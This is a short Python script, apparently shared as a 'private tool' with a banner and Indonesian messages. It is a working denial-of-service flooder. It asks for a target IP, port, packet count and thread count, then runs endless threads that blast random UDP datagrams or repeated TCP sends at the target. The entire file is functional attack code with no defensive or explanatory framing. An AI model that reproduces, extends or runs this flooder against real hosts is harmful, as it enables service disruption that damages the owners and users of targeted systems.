#!/usr/bin/env python3
#Banu.py Private TOOLS V 2
import sys
import os
import random
import socket
import threading

os.system("clear")
print("""\x1b[1;92m
  ’  ____    _    _   _ _   _ 
 | __ )  / \  | \ | | | | |
 |  _ \ / _ \ |  \| | | | |
 | |_) / ___ \| |\  | |_| |
 |____/_/   \_\_| \_|\___/ 
                           

 """)
print("↪  TOOLS INFORMATION  ↩")
print("↪ CREATOR : Banu")
print("↪ VERSION : V2↩")
print("↪ Banu.py Dkk↩")
print("↪ JANGAN LUPA SUBREK↩")

ip = str(input(" IP :"))
port = int(input(" Port :"))
choice = str(input(" UDP Only (y/n)):"))
times = int(input(" Packet :"))
threads = int(input(" Thread :"))
os.system("clear")
def run():
	data = random._urandom(2000)
	i = random.choice(("[×]","[?]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" TOK... TOK... PAKET DARI BANU..!!!")
		except:
			print("[!] Connection Time Out")

def run2():
	data = random._urandom(20)
	i = random.choice(("[×]","[?]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" TOK.. TOK.. PAKET DARI BANU!!!")
		except:
			s.close()
			print("[*] Connection Time Out")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()